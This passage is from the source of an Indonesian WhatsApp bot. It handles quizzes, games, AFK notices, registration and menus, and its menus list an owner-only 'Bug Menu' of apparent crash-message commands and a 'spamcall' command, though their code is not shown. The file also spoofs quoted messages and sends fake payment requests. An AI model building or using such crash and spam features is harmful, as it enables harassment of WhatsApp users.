} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}
	    
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await liaacans.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, creator, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await liaacans.sendText(room.x, str, m, { mentions: parseMention(str) } )
await liaacans.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
liaacans.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
liaacans.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) liaacans.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) liaacans.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) liaacans.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
liaacans.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) liaacans.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) liaacans.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
liaacans.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
luser.afkReason = ''
}

async function payment(jid, from, msg = { conversation: "Test" }, currency = "IDR", value = 5000) {
  const paymentTest = {
    amount: {
      currencyCode: currency,
      offset: 5000,
      value: value
    },
    expiryTimestamp: 0,
    amount1000: 10000 * 1000,
    currencyCodeIso4217: currency,
    requestFrom: from,
    noteMessage: msg
  }
  await liaacans.relayMessage(jid, { requestPaymentMessage: paymentTest }, {}) 
  return paymentTest
}
function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
function monospace(string) {
            return '```' + string + '```'
        }
function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = liaacans.sendMessage(m.chat, { text: teks, mentions: mems })
return res
} else {
let res = liaacans.sendMessage(m.chat, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
}
if (x1 == false) { return null } 
}

let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./json/user.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./json/user.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./json/user.json', JSON.stringify(db_user))} 
}})
}


//Auto Block Nomor Luar Negeri
if (m.sender.startsWith('212')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('1')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('237')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('885')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('880')) {
liaacans.updateBlockStatus(m.sender, 'block')
}
if (m.sender.startsWith('80')) {
liaacans.updateBlockStatus(m.sender, 'block')
}


//Push command To Console
if (command) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m LIAACANS \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
}
//━━━━━━━━━━━━━━━[ FITURNYA ]━━━━━━━━━━━━━━━━━//

switch(command) {
case 'verify': case 'daftar': case 'register':{
if (cekUser("id", m.sender) !== null) return m.reply('Kamu sudah terdaftar !!')
var res_us = `${makeid(10)}`
var user_name = `#GR${makeid(5)}`
let object_user = {"id": m.sender, "name": user_name, "seri": res_us }
db_user.push(object_user)
fs.writeFileSync('./json/user.json', JSON.stringify(db_user, 2, null))
mentions(`𝖬𝖾𝗆𝗎𝖺𝗍 𝖴𝗌𝖾𝗋 @${m.sender.split("@")[0]}`, [m.sender])
await sleep(1500)
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${m.sender.split('@')[0]}
○ Name : ${user_name}
○ Seri : ${res_us}

silahkan ketik #rules
untuk membaca rules bot
`
const buttonMessage = {
text: verify_teks,
footer: 'Klik button untuk melihat menu',
mentions: [m.sender],
buttons: [
{ buttonId: '#menu', buttonText: {displayText: '️⋮☰ 𝗠𝗘𝗡𝗨'}, type: 1}
],
headerType: 1
}
liaacans.sendMessage(m.chat, buttonMessage, {quoted:kafloc})
}
break
case 'allmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `BOT TELAH ONLINE : ${runtime(process.uptime())}`,jpegThumbnail: global.thumb}}}
allmenu = `Hy Kak ${pushname}
*${ucapanWaktu}*
┌─❖ ⌜ 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 ⌟
├ *Nama* : ${pushname}
├ *Premium* : ${isPremium ? '✅' : `❌`}
├ *Limit* : ${isPremium ? 'UNLIMITED' : `〽️${db.data.users[m.sender].limit}`}
├ *Mode* : ${liaacans.public ? 'Public' : `Self`}
├ *Prefix* :「 MULTI-PREFIX 」
└─❖

┌─❖ ⌜ 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 ⌟
├ *Hari Ini* : ${hariini}
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
└─❖

❖ [ List All Menu ] ❖

┌─❖ ⌜ Group Menu ⌟
├│${prefix}kick
├│${prefix}add
├│${prefix}promote
├│${prefix}demote
├│${prefix}delete
├│${prefix}setname
├│${prefix}setdesc
├│${prefix}listonline
├│${prefix}setppgrup
├│${prefix}revoke
├│${prefix}tagall
├│${prefix}vote
├│${prefix}hidetag
├│${prefix}ephemeral
├│${prefix}upvote
├│${prefix}devote
├│${prefix}cekvote
├│${prefix}delvote
├│${prefix}group
├│${prefix}editinfo
├│${prefix}mute
├│${prefix}antilink
├│${prefix}antilinkig
├│${prefix}antiwame
├│${prefix}antiviewonce
└─❖
┌─❖ ⌜ Fun Menu ⌟
├│${prefix}jadian
├│${prefix}jodohku
├│${prefix}apakah
├│${prefix}bisakah
├│${prefix}readmore
├│${prefix}kapankah
├│${prefix}gbtku
├│${prefix}menfess
├│${prefix}tictactoe
├│${prefix}delttt
├│${prefix}family100
├│${prefix}tebak
├│${prefix}math
├│${prefix}suitpvp
└─❖
┌─❖ ⌜ Converter Menu ⌟
├│${prefix}sticker
├│${prefix}smeme
├│${prefix}tourl
├│${prefix}toimage
├│${prefix}tovideo
├│${prefix}tomp3
├│${prefix}stickerwm
├│${prefix}emojimix
├│${prefix}emojimix2
└─❖
┌─❖ ⌜ Random Menu ⌟
├│${prefix}pinterest
├│${prefix}wallpaper
├│${prefix}couple
├│${prefix}quotesanime
├│${prefix}wikimedia
└─❖
┌─❖ ⌜ Download Menu ⌟
├│${prefix}play
├│${prefix}yts
├│${prefix}ytmp3
├│${prefix}ytmp4
├│${prefix}tiktokmp3
├│${prefix}igdl
├│${prefix}joox
├│${prefix}soundcloud
├│${prefix}twitter
├│${prefix}twittermp3
├│${prefix}fbdl
├│${prefix}pindl
├│${prefix}umma
└─❖
┌─❖ ⌜ Charger Menu ⌟
├│${prefix}bass
├│${prefix}blown
├│${prefix}deep
├│${prefix}earrape
├│${prefix}fast
├│${prefix}fat
├│${prefix}nightcore
├│${prefix}reverse
├│${prefix}robot
├│${prefix}slow
├│${prefix}tupai
└─❖
┌─❖ ⌜ Islamic Menu ⌟
├│${prefix}iqra
├│${prefix}hadist
├│${prefix}alquran
├│${prefix}juzamma
├│${prefix}tafsirquran
└─❖
┌─❖ ⌜ Database Menu ⌟
├│${prefix}setcmd
├│${prefix}listcmd
├│${prefix}delcmd
├│${prefix}lockcmd
├│${prefix}addmsg
├│${prefix}listmsg
├│${prefix}getmsg
├│${prefix}delmsg
└─❖
┌─❖ ⌜ Anonymous Menu ⌟
├│${prefix}anonymous
├│${prefix}start
├│${prefix}next
├│${prefix}keluar
└─❖
┌─❖ ⌜ Maker Menu ⌟
├│${prefix}crossfire
├│${prefix}ffcover
├│${prefix}beach
├│${prefix}igcertificate
├│${prefix}ytcertificate
├│${prefix}blackpink
├│${prefix}glass
├│${prefix}galaxy
├│${prefix}neon
└─❖
┌─❖ ⌜ Bug Menu (khusus owner) ⌟
├│${prefix}inibug
├│${prefix}poll
├│${prefix}troli2
├│${prefix}santetdia
├│${prefix}santetgc
├│${prefix}docu
├│${prefix}duc
├│${prefix}bug1
├│${prefix}bug2
├│${prefix}bug3
├│${prefix}bug4
├│${prefix}bug5
├│${prefix}bug6
├│${prefix}bug7
├│${prefix}lokas
├│${prefix}buglokas
├│${prefix}buginvite
├│${prefix}troli
├│${prefix}catalog
├│${prefix}cataloggc
├│${prefix}ampas1
├│${prefix}ampas2
├│${prefix}bugstik
├│${prefix}bugie
├│${prefix}bugtag
└─❖
┌─❖ ⌜ SOUND MENU [KHUSUS PREM] ⌟
├│${prefix}sound1
├│${prefix}sound2
├│${prefix}sound3
├│${prefix}sound4
├│${prefix}sound5
├│${prefix}sound6
├│${prefix}sound7
├│${prefix}sound8
├│${prefix}sound9
├│${prefix}sound10
├│${prefix}sound11
├│${prefix}sound12
├│${prefix}sound13
├│${prefix}sound14
├│${prefix}sound15
├│${prefix}sound16
├│${prefix}sound17
├│${prefix}sound18
├│${prefix}sound19
├│${prefix}sound20
├│${prefix}sound21
├│${prefix}sound22
├│${prefix}sound23
├│${prefix}sound24
├│${prefix}sound25
├│${prefix}sound26
├│${prefix}sound27
├│${prefix}sound28
├│${prefix}sound29
├│${prefix}sound30
├│${prefix}sound31
├│${prefix}sound32
├│${prefix}sound33
├│${prefix}sound34
├│${prefix}sound35

NOTE : FITUR SOUND MENU NYA 74 YA, TAPI OWNERNYA MLES NGETIK:V
└─❖
┌─❖ ⌜ Owner Menu ⌟
├│${prefix}ping
├│${prefix}owner
├│${prefix}setppbot
├│${prefix}listpc
├│${prefix}listgc
├│${prefix}mls
├│${prefix}mlsy
├│${prefix}mlsmile
├│${prefix}mlsmiley
├│${prefix}sc
├│${prefix}join
├│${prefix}leave
├│${prefix}block
├│${prefix}unblock
├│${prefix}bc
├│${prefix}self
├│${prefix}public
└─❖
┌─❖ ⌜ Main Menu ⌟
├│${prefix}sewabot
├│${prefix}spamcall
├│${prefix}tts
├│${prefix}ssweb-pc
├│${prefix}infogempa
├│${prefix}topupmenu
├│${prefix}tts
├│${prefix}shopeepay
├│${prefix}ovo
├│${prefix}topupgame
├│${prefix}listdmff
├│${prefix}listdmml
├│${prefix}listdmml2
├│${prefix}buypulsa
├│${prefix}topupff
├│${prefix}topupml
├│${prefix}topupml2
├│${prefix}topupff2
├│${prefix}rules
├│${prefix}caraorder
├│${prefix}cekstatus
├│${prefix}item
├│${prefix}additem
├│${prefix}delitem
├│${prefix}changeitem
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, allmenu, creator, m, { quoted: kafloc })
            }
         break
case 'menu': case 'help': case 'command': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
const sections = [
    {
	title: `ALL MENU`,
	rows: [
	    {title: "ALL MENU", rowId: `${prefix}allmenu`}
	]
    },
    {
	title: `GROUP MENU`,
	rows: [
	    {title: "GROUP MENU", rowId: `${prefix}groupmenu`}
	]
    },
    {
	title: `FUN MENU`,
	rows: [
	    {title: "FUN MENU", rowId: `${prefix}funmenu`}
	]
    },
    {
	title: `ANONYMOUS MENU`,
	rows: [
	    {title: "ANONYMOUS NENU", rowId: `${prefix} anonymousmenu`}
	]
    },
    {
	title: `CONVERT MENU`,
	rows: [
	    {title: "CONVERT MENU", rowId: `${prefix}convertmenu`}
	]
    },
    {
	title: `BUG MENU [ KHUSUS OWNER ]`,
	rows: [
	    {title: "BUG MENU", rowId: `${prefix}bugmenu`}
	]
    },
    {
	title: `RANDOM MENU`,
	rows: [
	    {title: "RANDOM MENU", rowId: `${prefix}randommenu`}
	]
    },
    {
	title: `DOWNLOAD MENU [ KHUSUS PREM ]`,
	rows: [
	    {title: "DOWNLOAD MENU", rowId: `${prefix}downloadmenu`}
	]
	},
	{
	title: `OWNER MENU [ KHUSUS OWN ]`,
	rows: [
	    {title: "OWNER MENU", rowId: `${prefix}ownermenu`}
	]
    },
    {
	title: `DATABASE MENU`,
	rows: [
	    {title: "DATABASE MENU", rowId: `${prefix}databasemenu`}
	]
    },
    {
	title: `ISLAMIC MENU`,
	rows: [
	    {title: "ISLAMIC MENU", rowId: `${prefix}islamicmenu`}
	]
	},
	{
	title: `CHARGER MENU`,
	rows: [
	    {title: "CHARGER MENU", rowId: `${prefix}chargermenu`}
	]
	},
	{
	title: `MAKER MENU`,
	rows: [
	    {title: "MAKER MENU", rowId: `${prefix}makermenu`}
	]
	},
	{
	title: `MAIN MENU`,
	rows: [
	    {title: "MAIN MENU", rowId: `${prefix}mainmenu`}
	]
    },
    {
	title: `SOUND MENU [KHUSUS PREM]`,
	rows: [
	    {title: "SOUND MENU", rowId: `${prefix}soundmenu`}
	]
	},
    {
	title: `RUNTIME BOT`,
	rows: [
	    {title: "RUNTIME BOT", rowId: `${prefix}runtime`}
	]
	},
	{
	title: `PING BOT`,
	rows: [
	    {title: "SPEED TEST", rowId: `${prefix}ping`}
	]
	},
]
let menunyaa = `Hai Kak ${pushname}
*${ucapanWaktu}*
┌─❖ ⌜ 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 ⌟
├ *Nama* : ${pushname}
├ *Premium* : ${isPremium ? '✅' : `❌`}
├ *Limit* : ${isPremium ? 'UNLIMITED' : `〽️${db.data.users[m.sender].limit}`}
├ *Mode* : ${liaacans.public ? 'Public' : `Self`}
├ *Prefix* :「 MULTI-PREFIX 」
└─❖

┌─❖ ⌜ 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 ⌟
├ *Hari Ini* : ${hariini}
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
└─❖

Note : Jangan Spam Bot Dan
Call, Jika Tidak Ingin Di Block Bot`
const listMessage = {
  text: menunyaa,
  footer: "© Created by Kizu-MD",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await liaacans.sendMessage(m.chat, listMessage, { quoted: kafloc })
}
break
case 'funmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
funmenu = `┌─❖ ⌜ FUN MENU ⌟
├│${prefix}jadian
├│${prefix}jodohku
├│${prefix}apakah
├│${prefix}bisakah
├│${prefix}readmore
├│${prefix}kapankah
├│${prefix}gbtku
├│${prefix}menfess
├│${prefix}tictactoe
├│${prefix}delttt
├│${prefix}family100
├│${prefix}tebak
├│${prefix}math
├│${prefix}suitpvp
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, funmenu, creator, m, { quoted: kafloc })
            }
            break
case 'groupmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
group = `┌─❖ ⌜ GROUP MENU ⌟
├│${prefix}kick
├│${prefix}add
├│${prefix}promote
├│${prefix}demote
├│${prefix}listonline
├│${prefix}delete
├│${prefix}setname
├│${prefix}setdesc
├│${prefix}setppgrup
├│${prefix}revoke
├│${prefix}tagall
├│${prefix}vote
├│${prefix}hidetag
├│${prefix}ephemeral
├│${prefix}upvote
├│${prefix}devote
├│${prefix}cekvote
├│${prefix}delvote
├│${prefix}group
├│${prefix}editinfo
├│${prefix}mute
├│${prefix}antilink
├│${prefix}antilinkig
├│${prefix}antiwame
├│${prefix}antiviewonce
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, group, creator, m, { quoted: kafloc })
            }
            break
case 'convertmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
convermenu = `┌─❖ ⌜ Converter Menu ⌟
├│${prefix}sticker
├│${prefix}smeme
├│${prefix}tourl
├│${prefix}toimage
├│${prefix}tovideo
├│${prefix}tomp3
├│${prefix}stickerwm
├│${prefix}emojimix
├│${prefix}emojimix2
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, convermenu, creator, m, { quoted: kafloc })
            }
            break
case 'randommenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
rm = `┌─❖ ⌜ Random Menu ⌟
├│${prefix}pinterest
├│${prefix}wallpaper
├│${prefix}couple
├│${prefix}quotesanime
├│${prefix}wikimedia
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, rm, creator, m, { quoted: kafloc })
            }
            break
case 'downloadmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
if(!isPremium)throw`Fitur Ini Khusus Untuk Premium`
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
downloadme = `┌─❖ ⌜ Download Menu ⌟
├│${prefix}play
├│${prefix}yts
├│${prefix}ytmp3
├│${prefix}ytmp4
├│${prefix}tiktokmp3
├│${prefix}igdl
├│${prefix}joox
├│${prefix}soundcloud
├│${prefix}twitter
├│${prefix}twittermp3
├│${prefix}fbdl
├│${prefix}pindl
├│${prefix}umma
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, downloadme, creator, m, { quoted: kafloc })
            }
            break
case 'ownermenu': {
if(!isCreator)throw`Fitur Ini Khusus Untuk Owner`
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
ownerme = `┌─❖ ⌜ Owner Menu ⌟
├│${prefix}createcp
├│${prefix}listcp
├│${prefix}terminate
├│${prefix}ping
├│${prefix}owner
├│${prefix}sc
├│${prefix}join
├│${prefix}setppbot
├│${prefix}listgc
├│${prefix}listpc
├│${prefix}mls
├│${prefix}mlsy
├│${prefix}mlsmile
├│${prefix}mlsmiley
├│${prefix}leave
├│${prefix}block
├│${prefix}unblock
├│${prefix}bc
├│${prefix}self
